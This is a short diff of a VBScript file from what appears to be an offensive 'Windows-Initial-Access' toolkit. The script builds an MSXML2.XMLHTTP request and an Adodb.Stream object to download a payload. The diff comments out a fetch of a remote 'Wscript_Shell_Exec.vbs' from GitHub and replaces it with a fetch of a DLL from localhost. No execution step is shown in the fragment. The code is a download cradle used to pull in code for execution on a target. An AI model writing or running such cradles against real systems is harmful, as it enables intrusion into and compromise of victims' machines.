@@ -5,7 +5,8 @@
 ' "MSXML2.XMLHTTP.6.0"
 
 Set xHttp = CreateObject("MSXML2.XMLHTTP.6.0")
-xHttp.Open "GET", "https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs", False
+'xHttp.Open "GET", "https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs", False
+xHttp.Open "GET", "http://127.0.0.1:8000/ExampleAssembly.dll", False
 xHttp.Send
 
 Set bStrm = CreateObject("Adodb.Stream")
